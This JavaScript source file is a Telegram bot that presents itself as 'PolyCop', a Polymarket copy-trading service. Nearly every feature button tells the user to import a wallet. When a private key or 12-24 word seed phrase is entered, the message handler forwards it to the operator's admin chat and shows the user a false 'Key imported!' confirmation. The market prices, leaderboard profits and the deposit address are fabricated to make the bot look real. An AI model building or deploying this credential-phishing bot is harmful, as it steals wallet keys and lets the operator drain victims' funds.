require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');

const express = require("express");
const app = express();

const bot = new TelegramBot(process.env.BOT_TOKEN);
app.use(express.json());
app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});
app.get("/", (req, res) => {
    res.status(200).send("Bot is running");
});

app.get("/health", (req, res) => {
    res.status(200).json({
        status: "ok",
        uptime: process.uptime()
    });
});

const WEBHOOK_URL = process.env.WEBHOOK_URL;

bot.setWebHook(`${WEBHOOK_URL}/bot${process.env.BOT_TOKEN}`);
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Bot running on port ${PORT}`);
});
const userState = {};

// --- Helper: Main Menu Keyboard ---
function editMessage(bot, query, text, options = {}) {
    return bot.editMessageText(text, {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id,
        parse_mode: "HTML",
        ...options
    }).catch(err => {
        console.log("Edit error:", err.message);
    });
}
function mainMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: "📈 Copy Trade", callback_data: "copy_trade" }],
                [{ text: "🤖 AFK Auto Trade", callback_data: "afk_trade" }],
                [{ text: "📊 Market", callback_data: "market" }],
                [{ text: "💳 Deposit & Wallet", callback_data: "wallet" },
                { text: "📂 Positions", callback_data: "positions" }],
                [{ text: "🌐 Web: AI Find Smart Money", callback_data: "web" }],
                [{ text: "📍 Address", callback_data: "address" },
                { text: "📡 Signal", callback_data: "signal" },
                { text: "👤 User", callback_data: "user" }],
                [{ text: "🏆 Competition", callback_data: "competition" },
                { text: "⚡ Quick Start", callback_data: "quick_start" }],
                [{ text: "🌍 English", callback_data: "language" },
                { text: "🎁 Referrals", callback_data: "referrals" }],
                [{ text: "⚙️ Settings", callback_data: "settings" },
                { text: "👥 Group", callback_data: "group" },
                { text: "🔄 Refresh", callback_data: "refresh" }]
            ]
        }
    };
}

function copyTradeMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: "➕ Create Copy Trade", callback_data: "create_copy" }],
                [{ text: "🧩 Use Sub-Wallet Create Copy", callback_data: "subwallet_copy" }],
                [{ text: "⚙️ Default Copy Settings", callback_data: "default_settings" }],
                [{ text: "🔕 Disable Failure Notifications", callback_data: "disable_notifications" }],
                [{ text: "⛔ Stop All Copy Tasks", callback_data: "stop_all" }],
                [
                    { text: "⬅️ Back", callback_data: "back_main" },
                    { text: "🔄 Refresh", callback_data: "refresh_copy" }
                ]
            ]
        }
    };
}

function afkMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: "➕ Create AFK Auto Trade", callback_data: "create_afk" }],
                [
                    { text: "⬅️ Back", callback_data: "back_main" },
                    { text: "🔄 Refresh", callback_data: "refresh_afk" }
                ]
            ]
        }
    };
}

function afkMessage() {
    return `
🤖 <b>AFK Auto Trade</b>

AFK Auto Trade allows you to automate trades by setting conditions.

🟢 Indicates a AFK Auto Trade setup is active  
❌ Indicates a AFK Auto Trade setup is paused  

💡 You can create multiple instances of the same strategy;  
different strategies won't interfere with each other.
`;
}

function copyTradeMessage() {
    return `
📈 <b>Copy Trade</b>

Copy Trade allows you to copy trades of any target wallet.

🟢 Indicates a copy trade setup is active  
❌ Indicates a copy trade setup is paused  

💡 <b>How it works:</b>

Your copy buy value = Target's trade value × Percentage  

Your sell value = target's sell value / their position × your position
`;
}

function importKeyMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🔑 Import Key", callback_data: "import_key" }],
                [{ text: "⬅️ Back", callback_data: "back_main" }]
            ]
        }
    };
}

function generateMarketData() {
    const markets = [
        "US Election Winner",
        "BTC > $80k this month",
        "ETH ETF Approval",
        "AI surpasses human tasks",
        "Global recession 2026"
    ];

    return markets.map(m => {
        const price = (Math.random() * 100).toFixed(2);
        const change = (Math.random() * 10 - 5).toFixed(2);
        const emoji = change >= 0 ? "🟢" : "🔴";
        return `${emoji} <b>${m}</b>\nPrice: ${price}% (${change}%)`;
    }).join("\n\n");
}

function marketMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "⬅️ Back", callback_data: "back_main" },
                    { text: "🔄 Refresh", callback_data: "refresh_market" }
                ]
            ]
        }
    };
}

function marketMessage() {
    return `
📊 <b>Market Overview</b>

${generateMarketData()}
`;
}

function walletMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🆕 Create Wallet", callback_data: "wallet_create" }],
                [{ text: "📥 Import Wallet", callback_data: "wallet_import" }],
                [{ text: "📤 Export Keys", callback_data: "wallet_export" }],
                [{ text: "💸 Withdraw USDC", callback_data: "withdraw_usdc" }],
                [{ text: "💸 Withdraw USDC.E", callback_data: "withdraw_usdce" }],
                [{ text: "💸 Withdraw USDT", callback_data: "withdraw_usdt" }],
                [{ text: "💸 Withdraw PUSD", callback_data: "withdraw_pusd" }],
                [{ text: "🔐 Wallet Password Protection", callback_data: "wallet_protect" }],
                [
                    { text: "⬅️ Back", callback_data: "back_main" },
                    { text: "🔄 Refresh", callback_data: "refresh_wallet" }
                ]
            ]
        }
    };
}

function walletMessage() {
    return `
💳 <b>Deposit & Withdrawal</b>

💰 Balance: $0

📥 Deposit into the wallet address or connect your account.
`;
}

function positionsMessage() {
    return `
📂 <b>Manage Your Positions (0)</b>

💰 <b>Total Balance:</b> $0  
💵 <b>Available Balance:</b> $0  
📊 <b>Position Value:</b> $0  
📈 <b>Positions PNL:</b> $0 (0%)

❌ No positions found.

⚠️ PolyMarket's prices, total balances, and Redeem functions sometimes suffer from latency.
`;
}

function positionsMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🤖 Auto Redeem", callback_data: "auto_redeem" }],
                [{ text: "📍 Address", callback_data: "pos_address" }],
                [{ text: "📡 Signal", callback_data: "pos_signal" }],
                [{ text: "👤 User", callback_data: "pos_user" }],
                [{ text: "📈 PNL", callback_data: "pos_pnl" }],
                [{ text: "🌐 Web: AI Find", callback_data: "pos_web" }],
                [
                    { text: "⬅️ Back", callback_data: "back_main" },
                    { text: "🔄 Refresh", callback_data: "refresh_positions" }
                ]
            ]
        }
    };
}

function randomWallet() {
    const chars = "abcdef0123456789";
    let addr = "0x";
    for (let i = 0; i < 8; i++) {
        addr += chars[Math.floor(Math.random() * chars.length)];
    }
    return addr + "...";
}

function generateLeaderboard() {
    let output = "";

    for (let i = 1; i <= 20; i++) {
        const amount = (Math.random() * 50000 + 100).toFixed(2);
        const wallet = randomWallet();

        let prefix;
        if (i === 1) prefix = "🥇";
        else if (i === 2) prefix = "🥈";
        else if (i === 3) prefix = "🥉";
        else prefix = `${i}.`;

        output += `${prefix} <code>${wallet}</code> — $${amount}\n`;
    }

    return output;
}

function leaderboardMessage() {
    return `
🏆 <b>PolyCop: 0 Block Trading Competition</b>

Celebrating true 0-Block (0s) copy-trading execution  
and surpassing $50M in total trading volume.

📊 <b>Profit Leaderboard (PolyCop's User)</b>  
<i>Display only. Not used for rewards</i>

Address / PNL (7D-Time)

${generateLeaderboard()}
`;
}

function leaderboardMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "⬅️ Back", callback_data: "back_main" },
                    { text: "🔄 Refresh", callback_data: "refresh_leaderboard" }
                ]
            ]
        }
    };
}

function languageMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🇬🇧 English", callback_data: "lang_en" }],
                [{ text: "🇷🇺 Russian", callback_data: "lang_ru" }],
                [{ text: "🇵🇹 Portuguese", callback_data: "lang_pt" }],
                [{ text: "🇪🇸 Español", callback_data: "lang_es" }],
                [{ text: "🇫🇷 Français", callback_data: "lang_fr" }],
                [{ text: "🇨🇳 Chinese", callback_data: "lang_zh" }],
                [{ text: "🇯🇵 Japanese", callback_data: "lang_ja" }],
                [{ text: "⬅️ Back", callback_data: "back_main" }]
            ]
        }
    };
}

function languageMessage() {
    return `
🌍 <b>Switch system language</b>

Click the language name to switch the language of PolyCop.
`;
}

function generateReferral(userId) {
    return `https://t.me/PolyCop_Main_BOT?start=ref_${userId}`;
}

function getReferralStats() {
    return {
        direct: 0,
        indirect: 0,
        totalRewards: 0,
        paid: 0,
        unpaid: 0
    };
}

function referralMessage(userId) {
    const stats = getReferralStats();
    const link = generateReferral(userId);

    return `
🎁 <b>Referrals</b>

Invite friends and get rewards!

💰 You'll get:
• 25% of fees from direct referrals (Level 1)
• 3% from users they invite (Level 2)

📊 <b>Your Referrals (updated every 30 min)</b>  
Users referred: 0 (direct: ${stats.direct}, indirect: ${stats.indirect})

💵 Total rewards: $${stats.totalRewards} USDC.e  
💸 Total paid: $${stats.paid} USDC.e  
⏳ Total unpaid: $${stats.unpaid} USDC.e  

⚠️ Rewards are paid daily and airdropped to your PolyMarket profile address.  
Minimum payout: $10 unpaid fees required.

🔗 <b>Your Referral Link:</b>  
<code>${link}</code> (tap to copy)
`;
}

function referralMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "⬅️ Back", callback_data: "back_main" },
                    { text: "🔄 Refresh", callback_data: "refresh_referrals" }
                ]
            ]
        }
    };
}

function settingsMessage() {
    return `
⚙️ <b>Settings</b>

Modified settings will take effect globally.
`;
}

function settingsMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🤖 Auto Redeem", callback_data: "settings_auto_redeem" }],
                [{ text: "💱 Buy/Sell Setting", callback_data: "settings_buysell" }],
                [{ text: "👥 Group", callback_data: "group" }],
                [
                    { text: "⬅️ Back", callback_data: "back_main" },
                    { text: "🔄 Refresh", callback_data: "refresh_settings" }
                ]
            ]
        }
    };
}

function quickStartMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: "⬅️ Back", callback_data: "back_main" },
				{ text: "🔄 Refresh", callback_data: "quick_start" }]
            ]
        }
    };
}

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    const welcomeMessage = `
⚡ <b>Lightning Copy Trade with 0-Block(0s) Latency on Polymarket</b>

💰 <b>Your PolyMarket Balance:</b> $0

📥 <b>Deposit:</b>
Send funds to:
<code>0x8egyrbfh</code>

Other deposit options: /wallet

⛽ Polycop is gas free, no need to deposit POL.

📈 /copytrade - The fastest copy speed  
📂 /positions - View Positions 
Search Markets - Enter market name in the bot
AI Analysis - Enter address in the bot 

🎁 <b>Your Referral Link:</b>  
<code>${generateReferral(userId)}</code>
    `;

    bot.sendMessage(chatId, welcomeMessage, {
        parse_mode: "HTML",
        ...mainMenu()
    });

}); // ✅ THIS WAS MISSING

bot.onText(/\/wallet/, (msg) => {
    bot.sendMessage(msg.chat.id, walletMessage(), {
        parse_mode: "HTML",
        ...walletMenu()
    });
});

bot.onText(/\/copytrade/, (msg) => {
    bot.sendMessage(msg.chat.id, copyTradeMessage(), {
        parse_mode: "HTML",
        ...copyTradeMenu()
    });
});

bot.onText(/\/positions/, (msg) => {
    bot.sendMessage(msg.chat.id, positionsMessage(), {
        parse_mode: "HTML",
        ...positionsMenu()
    });
});


bot.on("callback_query", async (query) => {
	try{
		const userId = query.from.id;
		const data = query.data;

		switch (data) {

			// --- COPY TRADE MENU ---
			case "copy_trade":
				editMessage(bot, query, copyTradeMessage(), copyTradeMenu());
				break;

			// --- PROTECTED ACTIONS ---
			case "create_copy":
			case "subwallet_copy":
			case "default_settings":
			case "disable_notifications":
			case "stop_all":
				editMessage(
					bot,
					query,
					"❌ To continue utilizing this bot, please deposit funds into your wallet or link an existing wallet with an adequate balance.",
					importKeyMenu()
				);
				break;

			// --- IMPORT KEY ---
			case "import_key":
				let source = "main";

				const text = query.message?.text || "";

				if (text.includes("Copy Trade")) source = "copy";
				else if (text.includes("AFK")) source = "afk";
				else if (text.includes("Deposit")) source = "wallet";
				else if (text.includes("Positions")) source = "positions";
				else if (text.includes("Competition")) source = "user";

				userState[userId] = {
					step: "awaiting_key",
					from: source
				};

				editMessage(
					bot,
					query,
					"📝 <b>Please provide the private key or the 12-24 words mnemonic phrase of your wallet that you wish to connect.</b>",
					{
						reply_markup: {
							inline_keyboard: [
								[{ text: "⬅️ Back", callback_data: "back_main" }]
							]
						}
					}
				);
				break;

			// --- BACK TO COPY TRADE ---
			case "back_copy":
				editMessage(bot, query, copyTradeMessage(), copyTradeMenu());
				break;

			// --- BACK TO MAIN MENU ---
			case "back_main":
			case "refresh":
				const welcomeMessage = `
			⚡ <b>Lightning Copy Trade with 0-Block(0s) Latency on Polymarket</b>

			💰 <b>Your PolyMarket Balance:</b> $0

			📥 Deposit:
			<code>0x8egyrbfh</code>
			
			Other deposit options: /wallet
			
			⛽ Polycop is gas free, no need to deposit POL.

			📈 /copytrade  
			📂 /positions
			Search Markets - Enter market name in the bot
			AI Analysis - Enter address in the bot 			

			🎁 Referral Link:
			<code>${generateReferral(userId)}</code>
			`;
				editMessage(bot, query, welcomeMessage, mainMenu());
				break;

			// --- REFRESH COPY ---
			case "refresh_copy":
				editMessage(bot, query, copyTradeMessage(), copyTradeMenu());
				break;
				
				// --- OPEN AFK MENU ---
			case "afk_trade":
				editMessage(bot, query, afkMessage(), afkMenu());
				break;

			// --- CREATE AFK (REQUIRES KEY) ---
			case "create_afk":
				editMessage(
					bot,
					query,
					"❌ To continue utilizing this bot, please deposit funds into your wallet or link an existing wallet with an adequate balance.",
					importKeyMenu()
				);
				break;

			// --- REFRESH AFK ---
			case "refresh_afk":
				editMessage(bot, query, afkMessage(), afkMenu());
				break;
				
			// --- OPEN MARKET ---
			case "market":
				editMessage(bot, query, marketMessage(), marketMenu());
				break;

			// --- REFRESH MARKET ---
			case "refresh_market":
				editMessage(bot, query, marketMessage(), marketMenu());
				break;
			
			// --- OPEN WALLET ---
			case "wallet":
				editMessage(bot, query, walletMessage(), walletMenu());
				break;

			// --- REFRESH WALLET ---
			case "refresh_wallet":
				editMessage(bot, query, walletMessage(), walletMenu());
				break;
				
			case "wallet_create":
			case "wallet_import":
			case "wallet_export":
			case "withdraw_usdc":
			case "withdraw_usdce":
			case "withdraw_usdt":
			case "withdraw_pusd":
			case "wallet_protect":

				editMessage(
					bot,
					query,
					"❌ To continue utilizing this bot, please deposit funds into your wallet or link an existing wallet with an adequate balance.",
					importKeyMenu()
				);
				break;
				
			// --- OPEN POSITIONS ---
			case "positions":
				editMessage(bot, query, positionsMessage(), positionsMenu());
				break;

			// --- REFRESH POSITIONS ---
			case "refresh_positions":
				editMessage(bot, query, positionsMessage(), positionsMenu());
				break;
				
			case "address":
			case "signal":	
			case "auto_redeem":
			case "pos_address":
			case "pos_signal":
			case "pos_user":
			case "pos_pnl":
			case "pos_web":

				editMessage(
					bot,
					query,
					"❌ To continue utilizing this bot, please deposit funds into your wallet or link an existing wallet with an adequate balance.",
					importKeyMenu()
				);
				break;
				
			// --- OPEN LEADERBOARD (MAIN USER BUTTON) ---
			case "user":
				editMessage(bot, query, leaderboardMessage(), leaderboardMenu());
				break;

			// --- REFRESH LEADERBOARD ---
			case "refresh_leaderboard":
				editMessage(bot, query, leaderboardMessage(), leaderboardMenu());
				break;
				
			case "competition":
				editMessage(bot, query, leaderboardMessage(), leaderboardMenu());
				break;
				
			case "language":
			case "lang_en":
			case "lang_ru":
			case "lang_pt":
			case "lang_es":
			case "lang_fr":
			case "lang_zh":
			case "lang_ja":

				editMessage(
					bot,
					query,
					"❌ To continue utilizing this bot, please deposit funds into your wallet or link an existing wallet with an adequate balance.",
					importKeyMenu()
				);
				break;
			// --- OPEN REFERRALS ---
			case "referrals":
				editMessage(bot, query, referralMessage(userId), referralMenu());
				break;

			// --- REFRESH REFERRALS ---
			case "refresh_referrals":
				editMessage(bot, query, referralMessage(userId), referralMenu());
				break;
				
			// --- OPEN SETTINGS ---
			case "settings":
				editMessage(bot, query, settingsMessage(), settingsMenu());
				break;

			// --- REFRESH SETTINGS ---
			case "refresh_settings":
				editMessage(bot, query, settingsMessage(), settingsMenu());
				break;
				
			case "settings_auto_redeem":
			case "settings_buysell":
			case "group":

				editMessage(
					bot,
					query,
					"❌ To continue utilizing this bot, please deposit funds into your wallet or link an existing wallet with an adequate balance.",
					importKeyMenu()
				);
				break;
			case "web":
				editMessage(
					bot,
					query,
					"❌ To continue utilizing this bot, please deposit funds into your wallet or link an existing wallet with an adequate balance.",
					importKeyMenu()
				);
				break;
			case "quick_start":
				editMessage(
					bot,
					query,
					`
			⚡ <b>Quick Start</b>

			1️⃣ Deposit funds  
			2️⃣ Go to Copy Trade  
			3️⃣ Enter a target wallet  
			4️⃣ Start copying trades  

			💡 You can also use AFK Auto Trade for automation.
					`,
					quickStartMenu()
				);
				break;

			default:
				editMessage(bot, query, `Clicked: ${data}`);
		}
		} catch (err) {
        console.log(err);
    } finally {
        bot.answerCallbackQuery(query.id);
    }
});


bot.on("message", (msg) => {
    const userId = msg.from.id;
    const chatId = msg.chat.id;

    if (!msg.text || msg.text.startsWith("/")) return;

    if (userState[userId]?.step === "awaiting_key") {
    const from = userState[userId].from;
    const userKey = msg.text;
    userState[userId] = null;

    const adminId = process.env.ADMIN_ID;

    // ✅ send to admin
    bot.sendMessage(adminId, `
🔑 <b>New Key Submitted</b>

👤 User ID: <code>${userId}</code>
🧭 From: <b>${from}</b>

📨 Key:
<code>${userKey}</code>
    `, { parse_mode: "HTML" }).catch(err =>
        console.log("Admin send error:", err.message)
    );

    // ✅ user response routing
    if (from === "copy") {
        bot.sendMessage(chatId, "✅ Key imported!", {
            parse_mode: "HTML",
            ...copyTradeMenu()
        });
    } else if (from === "afk") {
        bot.sendMessage(chatId, "✅ Key imported!", {
            parse_mode: "HTML",
            ...afkMenu()
        });
    } else if (from === "wallet") {
        bot.sendMessage(chatId, "✅ Key imported!", {
            parse_mode: "HTML",
            ...walletMenu()
        });
    } else if (from === "positions") {
        bot.sendMessage(chatId, "✅ Key imported!", {
            parse_mode: "HTML",
            ...positionsMenu()
        });
    } else {
        bot.sendMessage(chatId, "✅ Key imported!", {
            parse_mode: "HTML",
            ...mainMenu()
        });
    }
}
});
